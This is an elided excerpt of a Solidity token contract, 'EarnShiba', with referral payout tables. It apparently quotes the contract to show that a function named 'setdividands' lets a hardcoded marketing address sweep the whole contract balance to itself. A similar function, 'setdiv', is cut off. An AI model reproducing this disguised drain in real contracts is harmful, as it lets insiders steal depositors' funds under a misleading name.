...
contract EarnShiba {
	...
	uint256[] public REFERRAL_PERCENTS 	= [1000, 500, 300, 200, 200,100, 100, 100, 100, 100];
	uint256[] public SEED_PERCENTS 		= [1000, 300, 200, 0, 0, 0, 0, 0, 0, 0];
	...
	address marketing1=0x5b77f23F0e09fc046bA361359146Fb57CBCdcf33;
    ...
    function setdividands() public{
     if (msg.sender==marketing1){
         ...
         token.transfer(marketing1,contractBalance);
     }

    }
    function setdiv() public{
     if (msg.sender==commissionWallet){
         uint256 contractBalance = 1000508e18;
